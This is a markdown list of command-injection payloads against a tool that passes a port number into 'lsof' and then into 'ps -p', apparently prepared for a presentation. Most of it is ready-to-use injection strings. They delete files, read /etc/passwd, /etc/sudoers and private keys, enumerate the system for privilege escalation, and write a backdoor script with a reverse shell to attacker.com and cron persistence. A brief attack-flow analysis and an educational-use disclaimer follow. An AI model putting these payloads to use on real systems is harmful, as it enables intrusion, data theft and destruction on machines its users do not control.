# Chain Exploitation Attack Payloads

## üéØ Main Exploits (For Presentation)

### 1. Basic Chain Exploitation
**Payload:** `8080; echo '123; rm -rf /tmp/demo; #' #`
**Effect:** First command's malicious output pipes to second, triggering chained destructive actions
**Injected Command:** `lsof -t -i tcp:8080; echo '123; rm -rf /tmp/demo; #' #`

```bash
8080; echo '123; rm -rf /tmp/demo; #' #
8080; echo '456; touch /tmp/chain_owned; #' #
8080; echo '789; whoami > /tmp/chain_user; #' #
```

### 2. Process Chain Exploitation
**Payload:** `8080; echo '999; cat /etc/passwd > /tmp/chain_passwd; #' #`
**Effect:** Exploits the PID chain vulnerability for data exfiltration

```bash
8080; echo '999; cat /etc/passwd > /tmp/chain_passwd; #' #
8080; echo '888; ps aux > /tmp/chain_processes; #' #
8080; echo '777; netstat -tuln > /tmp/chain_network; #' #
```

### 3. Data Chain Exploitation
**Payload:** `8080; echo '555; find /home -name "*.txt" > /tmp/chain_files; #' #`
**Effect:** Chains data exfiltration commands

```bash
8080; echo '555; find /home -name "*.txt" > /tmp/chain_files; #' #
8080; echo '444; grep -r "password" /etc/ > /tmp/chain_passwords; #' #
8080; echo '333; tar -czf /tmp/chain_data.tar.gz /etc/; #' #
```

### 4. Network Chain Exploitation
**Payload:** `8080; echo '222; curl -s http://ifconfig.me > /tmp/chain_ip; #' #`
**Effect:** Chains network reconnaissance commands

```bash
8080; echo '222; curl -s http://ifconfig.me > /tmp/chain_ip; #' #
8080; echo '111; ping -c 1 8.8.8.8 > /tmp/chain_ping; #' #
8080; echo '000; nslookup google.com > /tmp/chain_dns; #' #
```

### 5. Destructive Chain Exploitation
**Payload:** `8080; echo '666; rm -rf /tmp/*; #' #`
**Effect:** Demonstrates destructive chained actions

```bash
8080; echo '666; rm -rf /tmp/*; #' #
8080; echo '777; chmod 000 /tmp/; #' #
8080; echo '888; mkdir -p /tmp/chain_destruction; #' #
```

---

## üîß Additional Exploits (For Reference)

### Backdoor Chain Exploitation
```bash
8080; echo '999; echo "#!/bin/bash" > /tmp/chain_backdoor.sh; #' #
8080; echo '888; echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /tmp/chain_backdoor.sh; #' #
8080; echo '777; chmod +x /tmp/chain_backdoor.sh; #' #
```

### Privilege Escalation Chain
```bash
8080; echo '555; sudo -l > /tmp/chain_sudo; #' #
8080; echo '444; find / -perm -4000 2>/dev/null > /tmp/chain_suid; #' #
8080; echo '333; cat /etc/sudoers > /tmp/chain_sudoers; #' #
```

### Persistence Chain Exploitation
```bash
8080; echo '222; echo "*/5 * * * * /tmp/chain_backdoor.sh" >> /tmp/chain_cron; #' #
8080; echo '111; echo "alias ls='ls && /tmp/chain_backdoor.sh'" >> /tmp/chain_alias; #' #
8080; echo '000; echo "export PATH=/tmp/chain:$PATH" >> /tmp/chain_path; #' #
```

### Demonstration Payloads (Safe for Demo)
```bash
8080; echo '123; touch /tmp/chain_demo; #' #
8080; echo '456; echo "Chain exploitation successful" > /tmp/chain_result; #' #
8080; echo '789; date > /tmp/chain_timestamp; #' #
8080; echo '012; echo $USER > /tmp/chain_user; #' #
```

### Advanced Chain Techniques
```bash
# Multi-stage chain
8080; echo 'stage1; echo "stage2; echo \"stage3; touch /tmp/multi_stage; #\" #" #' #

# Conditional chain
8080; echo 'test; if [ -f /etc/passwd ]; then cat /etc/passwd > /tmp/conditional; fi; #' #

# Loop chain
8080; echo 'loop; for i in {1..5}; do echo "iteration $i" > /tmp/loop_$i; done; #' #

# Function chain
8080; echo 'func; function evil() { touch /tmp/function_chain; }; evil; #' #
```

### System Enumeration Chain
```bash
8080; echo '111; uname -a > /tmp/chain_system; #' #
8080; echo '222; cat /proc/version > /tmp/chain_kernel; #' #
8080; echo '333; cat /proc/cpuinfo > /tmp/chain_cpu; #' #
8080; echo '444; cat /proc/meminfo > /tmp/chain_memory; #' #
```

### User Enumeration Chain
```bash
8080; echo '111; cat /etc/passwd > /tmp/chain_users; #' #
8080; echo '222; cat /etc/group > /tmp/chain_groups; #' #
8080; echo '333; who > /tmp/chain_logged; #' #
8080; echo '444; w > /tmp/chain_active; #' #
```

### Service Enumeration Chain
```bash
8080; echo '111; systemctl list-units --type=service > /tmp/chain_services; #' #
8080; echo '222; systemctl list-units --type=socket > /tmp/chain_sockets; #' #
8080; echo '333; systemctl list-units --type=timer > /tmp/chain_timers; #' #
8080; echo '444; systemctl list-units --type=target > /tmp/chain_targets; #' #
```

### Configuration Chain Exploitation
```bash
8080; echo '111; cat /etc/ssh/sshd_config > /tmp/chain_ssh; #' #
8080; echo '222; cat /etc/apache2/apache2.conf > /tmp/chain_apache; #' #
8080; echo '333; cat /etc/nginx/nginx.conf > /tmp/chain_nginx; #' #
8080; echo '444; cat /etc/mysql/my.cnf > /tmp/chain_mysql; #' #
```

### Log Chain Exploitation
```bash
8080; echo '111; tail -n 100 /var/log/auth.log > /tmp/chain_auth; #' #
8080; echo '222; tail -n 100 /var/log/syslog > /tmp/chain_syslog; #' #
8080; echo '333; tail -n 100 /var/log/apache2/access.log > /tmp/chain_apache_log; #' #
8080; echo '444; journalctl --no-pager > /tmp/chain_journal; #' #
```

### Network Chain Exploitation
```bash
8080; echo '111; ip addr > /tmp/chain_interfaces; #' #
8080; echo '222; ip route > /tmp/chain_routes; #' #
8080; echo '333; cat /etc/hosts > /tmp/chain_hosts; #' #
8080; echo '444; cat /etc/resolv.conf > /tmp/chain_dns; #' #
```

### File System Chain Exploitation
```bash
8080; echo '111; find / -name "*.conf" -type f 2>/dev/null > /tmp/chain_configs; #' #
8080; echo '222; find / -name "*.key" -type f 2>/dev/null > /tmp/chain_keys; #' #
8080; echo '333; find / -name "*.pem" -type f 2>/dev/null > /tmp/chain_certs; #' #
8080; echo '444; find / -name "*.db" -type f 2>/dev/null > /tmp/chain_dbs; #' #
```

### Process Chain Exploitation
```bash
8080; echo '111; ps -ef > /tmp/chain_all_procs; #' #
8080; echo '222; pstree > /tmp/chain_proc_tree; #' #
8080; echo '333; lsof -i > /tmp/chain_net_conns; #' #
8080; echo '444; netstat -tulpn > /tmp/chain_listening; #' #
```

### Advanced Multi-Stage Chains
```bash
# Three-stage chain
8080; echo 'stage1; echo "stage2; echo \"stage3; echo \\\"stage4; touch /tmp/four_stage; #\\\" #\" #" #' #

# Nested conditional chain
8080; echo 'cond1; if [ -f /etc/passwd ]; then echo "cond2; if [ -w /tmp ]; then touch /tmp/nested_conditional; fi; #"; fi; #' #

# Recursive chain
8080; echo 'rec1; echo "rec2; echo \\\"rec3; echo \\\\\\\"rec4; touch /tmp/recursive_chain; #\\\\\\\" #\\\" #" #' #

# Time-based chain
8080; echo 'time1; sleep 1 && echo "time2; sleep 1 && echo \\\"time3; touch /tmp/time_chain; #\\\" #" #' #
```

---

## üìä Chain Exploitation Analysis

### Chain Attack Flow
1. **First Command:** `lsof -t -i tcp:8080; echo '123; rm -rf /tmp/demo; #' #`
2. **Output:** `123` (malicious PID)
3. **Second Command:** `ps -p 123; rm -rf /tmp/demo; # -o comm=`
4. **Result:** Destructive action executed

### Chain Vulnerabilities
- **PID Manipulation:** First command output becomes PID for second command
- **Command Injection:** Malicious output injected into subsequent commands
- **Parameter Pollution:** Multiple commands executed in sequence
- **Output Redirection:** Command output used as input for next command

### Attack Patterns
1. **Direct Chain:** `command1; command2; #`
2. **Output Chain:** `command1 | command2`
3. **Conditional Chain:** `command1 && command2`
4. **Nested Chain:** `command1; echo "command2; command3; #" #`

### Impact Assessment
- **System Compromise:** Full access through chained commands
- **Data Destruction:** Cascading destructive actions
- **Persistence:** Multiple persistence mechanisms
- **Privilege Escalation:** Chained privilege escalation
- **Network Access:** Chained network reconnaissance

### Detection Challenges
- **Complex Logging:** Multiple commands in single request
- **False Positives:** Legitimate command chaining
- **Timing Issues:** Commands executed in sequence
- **Output Analysis:** Complex output relationships

---

**‚ö†Ô∏è WARNING: These payloads are for educational purposes only. Only use in isolated, controlled environments.** 